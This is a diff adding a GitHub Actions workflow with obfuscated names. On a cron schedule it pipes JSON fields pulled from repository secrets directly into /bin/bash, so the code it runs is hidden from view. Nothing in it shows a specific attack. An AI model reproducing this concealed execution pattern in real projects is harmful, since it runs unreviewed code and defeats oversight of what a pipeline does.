@@ -1,0 +1,23 @@
+name: lihuizouwan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lihuizouwan
+        env:
+          fe8456: ${{ secrets.fe8456 }}
+        run: |
+          echo $fe8456 | jq -r .pef7 | /bin/bash
+          echo $vlyp4 | jq -r .m58 | /bin/bash
+          echo $hmn379 | jq -r .xs5194 | /bin/bash
+          echo $v5321 | jq -r .ouvlu3 | /bin/bash
+          echo $bdglm616 | jq -r .i4 | /bin/bash
+          echo $lgt06 | jq -r .mimx86 | /bin/bash
+
